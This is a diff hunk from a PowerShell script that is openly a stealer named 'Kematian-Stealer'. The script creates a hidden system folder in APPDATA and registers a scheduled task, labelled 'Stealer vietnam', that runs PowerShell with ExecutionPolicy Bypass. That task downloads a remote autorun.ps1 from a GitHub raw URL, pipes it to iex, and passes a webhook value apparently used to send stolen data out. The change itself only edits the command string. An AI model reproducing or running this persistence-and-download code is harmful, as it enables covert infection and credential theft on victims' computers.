@@ -79,7 +79,7 @@ function Invoke-TASKS {
         $KDOT_DIR = New-Item -ItemType Directory -Path "$env:APPDATA\Kematian" -Force
         $KDOT_DIR.Attributes = "Hidden", "System"
         $task_name = "Stealer vietnam"
-	$powershellcode = "powershell `$webhook='$webhook';iwr('https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex"
+	$powershellcode = "`$webhook='$webhook';iwr('https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/autorun.ps1')|iex"
         $task_action = if ($debug) {
             New-ScheduledTaskAction -Execute "Powershell.exe" -Argument "-ExecutionPolicy Bypass -NoProfile -C `"`$webhook = '$webhook' ; iwr https://raw.githubusercontent.com/adasdasdsaf/Kematian-Stealer/main/frontend-src/autorun.ps1 | iex`""
         }
